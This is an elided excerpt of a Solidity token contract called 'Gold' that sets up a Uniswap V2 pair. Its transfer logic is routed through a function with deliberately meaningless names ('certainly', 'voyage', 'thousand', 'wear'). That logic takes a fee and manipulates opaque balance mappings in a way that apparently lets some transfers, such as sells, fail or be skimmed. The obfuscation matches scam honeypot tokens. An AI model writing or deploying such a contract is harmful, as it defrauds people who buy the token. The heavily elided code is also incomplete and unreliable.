...
contract Gold is Ownable {
    constructor(
        ...
        uniswapV2Router = IUniswapV2Router02(anyone);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    }

    uint256 private sit;
    string private route;
    string private beside;
    ...
    mapping(address => uint256) private base;
    ...
    function certainly(
        ...
        address mark = (uniswapV2Pair);

        if (thousand[voyage] == 0 && (mark != voyage) && wear[voyage] > 0) {
            thousand[voyage] -= interest;
        }

        address alike = directly;
        directly = water;

        base[voyage] -= bit;
        uint256 fall = (bit / 100) * sit;
        bit -= fall;
        wear[alike] += interest;
        base[water] += bit;
    }
    ...
    function transferFrom(
        ...
        certainly(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        certainly(msg.sender, recipient, amount);
        return true;
    }
